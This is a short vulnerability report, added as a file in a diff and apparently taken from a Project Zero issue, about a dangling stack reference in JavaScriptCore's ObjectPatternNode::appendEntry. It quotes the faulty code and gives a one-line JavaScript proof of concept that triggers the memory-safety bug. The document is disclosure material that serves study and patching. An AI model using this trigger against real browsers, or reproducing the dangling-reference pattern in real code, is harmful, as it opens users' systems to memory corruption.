@@ -1,0 +1,25 @@
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1256
+
+Here's a snippet of ObjectPatternNode::appendEntry.
+
+void appendEntry(const JSTokenLocation&, ExpressionNode* propertyExpression, DestructuringPatternNode* pattern, ExpressionNode* defaultValue, BindingType bindingType)
+{
+    m_targetPatterns.append(Entry{ Identifier(), propertyExpression, false, pattern, defaultValue, bindingType });
+}
+
+Here's the definition of Entry.
+
+struct Entry {
+    const Identifier& propertyName;
+    ExpressionNode* propertyExpression;
+    bool wasString;
+    DestructuringPatternNode* pattern;
+    ExpressionNode* defaultValue;
+    BindingType bindingType;
+};
+
+The Identifier object created by "Identifier()" is in the stack. So it will get freed in the end of the appendEntry method.
+
+PoC:
+
+var {[a]: b, ...[]} = {};
